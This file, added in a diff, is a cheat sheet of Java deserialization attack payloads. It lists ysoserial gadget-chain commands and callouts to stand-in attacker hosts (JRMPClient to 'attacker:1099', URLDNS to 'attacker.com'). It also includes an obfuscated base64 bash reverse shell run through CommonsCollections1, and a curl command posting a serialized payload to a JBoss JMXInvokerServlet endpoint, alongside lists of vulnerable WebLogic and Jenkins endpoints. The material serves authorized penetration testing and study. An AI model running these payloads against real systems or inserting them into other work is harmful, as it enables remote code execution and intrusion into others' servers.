@@ -1,0 +1,49 @@
+# Java Deserialization Payloads
+
+# ============ Detection ============
+# Java serialized objects start with: AC ED 00 05 (hex) or rO0AB (base64)
+# Look for: ObjectInputStream, readObject(), readUnshared()
+
+# ============ Tools ============
+# ysoserial: https://github.com/frohoff/ysoserial
+# Generate payload:
+# java -jar ysoserial.jar <gadget> '<command>'
+
+# ============ Common Gadgets ============
+java -jar ysoserial.jar CommonsCollections1 'id'
+java -jar ysoserial.jar CommonsCollections2 'id'
+java -jar ysoserial.jar CommonsCollections3 'id'
+java -jar ysoserial.jar CommonsCollections4 'id'
+java -jar ysoserial.jar CommonsCollections5 'id'
+java -jar ysoserial.jar CommonsCollections6 'id'
+java -jar ysoserial.jar CommonsCollections7 'id'
+java -jar ysoserial.jar CommonsBeanutils1 'id'
+java -jar ysoserial.jar Spring1 'id'
+java -jar ysoserial.jar Spring2 'id'
+java -jar ysoserial.jar Groovy1 'id'
+java -jar ysoserial.jar JRMPClient 'attacker:1099'
+java -jar ysoserial.jar URLDNS 'http://attacker.com'
+
+# ============ Reverse Shell ============
+java -jar ysoserial.jar CommonsCollections1 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9JUC9QT1JUIDA+JjE=}|{base64,-d}|{bash,-i}'
+
+# ============ Base64 encode payload ============
+java -jar ysoserial.jar CommonsCollections1 'id' | base64 -w0
+
+# ============ Burp Extension ============
+# Java Deserialization Scanner
+# Detects vulnerable endpoints
+
+# ============ JBoss/WildFly ============
+# /invoker/JMXInvokerServlet
+# /invoker/EJBInvokerServlet
+curl -X POST http://target/invoker/JMXInvokerServlet --data-binary @payload.ser
+
+# ============ WebLogic ============
+# /wls-wsat/CoordinatorPortType
+# /_async/AsyncResponseService
+# T3 protocol on port 7001
+
+# ============ Jenkins ============
+# /cli endpoint
+# /cli?remoting=false
